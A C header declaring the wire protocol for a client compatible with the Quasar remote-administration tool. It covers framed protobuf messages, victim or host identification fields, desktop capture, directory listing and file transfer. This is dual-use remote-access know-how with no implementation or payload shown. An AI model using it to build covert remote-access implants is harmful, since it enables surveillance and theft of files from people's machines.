/**
 * remote_protocol.h
 * Protobuf encoding/decoding matching reference Quasar protocol.
 * Frame: 4-byte little-endian length + payload (same as PayloadWriter/PayloadReader).
 * Payload: IMessage = tag 1 varint (subtype index) + concrete message (see remote_protocol_types.h).
 */
#ifndef REMOTE_PROTOCOL_H
#define REMOTE_PROTOCOL_H
#include "remote_protocol_types.h"

#ifdef __cplusplus
extern "C" {
#endif

/* Client identification payload (to send to server). Fill before encode. */
typedef struct remote_identification {
    const char* version;
    const char* operating_system;
    const char* account_type;
    const char* country;
    const char* country_code;
    int image_index;
    const char* id;           /* must be 64 chars for server to accept */
    const char* username;
    const char* pc_name;
    const char* tag;
    const char* encryption_key;
    const unsigned char* signature;
    unsigned int signature_len;
} remote_identification_t;

/* Encode ClientIdentification to buffer. Returns byte count, or 0 on error. */
unsigned int remote_proto_encode_identification(const remote_identification_t* id, unsigned char* out, unsigned int out_size);

/* Decode ClientIdentificationResult from payload. Returns 1 if Result is true, 0 otherwise. */
int remote_proto_decode_identification_result(const unsigned char* payload, unsigned int payload_len);

/* Write frame (4-byte LE length + payload) to buffer. Returns total bytes (4 + payload_len). */
unsigned int remote_proto_write_frame(const unsigned char* payload, unsigned int payload_len, unsigned char* out, unsigned int out_size);

/* Read frame: read 4-byte length from stream, return length (payload size). Length value stored in *out_payload_len. */
int remote_proto_read_frame_length(const unsigned char* header4, unsigned int* out_payload_len);

/* Encode GetMonitorsResponse body only (field 1 varint = Number). Use with remote_proto_prepend_imessage. */
unsigned int remote_proto_encode_get_monitors_response(int number, unsigned char* out, unsigned int out_size);

/* Write IMessage frame: subtype (tag 1 varint) + body into out. Returns total length or 0. */
unsigned int remote_proto_prepend_imessage(unsigned char* out, unsigned int out_size, unsigned int subtype_index, const unsigned char* body, unsigned int body_len);

/* Read IMessage subtype from payload (08 <varint>). Returns subtype or 0; *out_consumed = bytes read (0 if invalid). */
unsigned int remote_proto_read_subtype(const unsigned char* payload, unsigned int payload_len, unsigned int* out_consumed);

/* Encode GetDrivesResponse body (field 1 repeated Drive). Use GetLogicalDriveStrings. Returns body length or 0. */
unsigned int remote_proto_encode_get_drives_response(unsigned char* out, unsigned int out_size);

/* Encode GetSystemInfoResponse body (field 1 repeated key-value). Returns body length or 0. */
unsigned int remote_proto_encode_get_system_info_response(unsigned char* out, unsigned int out_size);

/* Parse GetDesktop body (after IMessage subtype): fill quality and display_index. Returns 1 on success. */
int remote_proto_decode_get_desktop(const unsigned char* body, unsigned int body_len, int* quality, int* display_index);

/* Encode GetDesktopResponse body: Image (4-byte LE length + codec first frame), Quality, Monitor, Resolution. image_data = 4-byte length + image bytes. Returns body length or 0. */
unsigned int remote_proto_encode_get_desktop_response(const unsigned char* image_data, unsigned int image_len, int quality, int monitor, int width, int height, unsigned char* out, unsigned int out_size);

/* Parse GetDirectory body: field 1 RemotePath. Copies path into path_buf (max path_buf_size). Returns 1 on success. */
int remote_proto_decode_get_directory(const unsigned char* body, unsigned int body_len, char* path_buf, unsigned int path_buf_size);

/* Encode GetDirectoryResponse body: RemotePath + repeated FileSystemEntry (EntryType, Name, Size). Returns body length or 0. */
unsigned int remote_proto_encode_get_directory_response(const char* remote_path, unsigned char* out, unsigned int out_size);

/* Parse FileTransferRequest body: field 1 Id (varint), field 2 RemotePath (string). Returns 1 on success. */
int remote_proto_decode_file_transfer_request(const unsigned char* body, unsigned int body_len, int* out_id, char* path_buf, unsigned int path_buf_size);

/* Parse FileTransferChunk body (when receiving from server): Id, FilePath, FileSize, Chunk (Offset, Data).
 * data_buf must hold at least data_len bytes; caller provides buffer. Returns 1 on success. */
int remote_proto_decode_file_transfer_chunk(const unsigned char* body, unsigned int body_len, int* out_id, char* path_buf, unsigned int path_buf_size, long long* out_file_size, long long* out_offset, unsigned char* data_buf, unsigned int data_buf_size, unsigned int* out_data_len);

/* Encode FileTransferChunk body: Id, FilePath, FileSize, Chunk (Offset, Data). Returns body length or 0. */
unsigned int remote_proto_encode_file_transfer_chunk(int id, const char* file_path, long long file_size, long long offset, const unsigned char* data, unsigned int data_len, unsigned char* out, unsigned int out_size);

/* Encode FileTransferComplete body: Id, FilePath. Returns body length or 0. */
unsigned int remote_proto_encode_file_transfer_complete(int id, const char* file_path, unsigned char* out, unsigned int out_size);

#ifdef __cplusplus
}
#endif

#endif /* REMOTE_PROTOCOL_H */
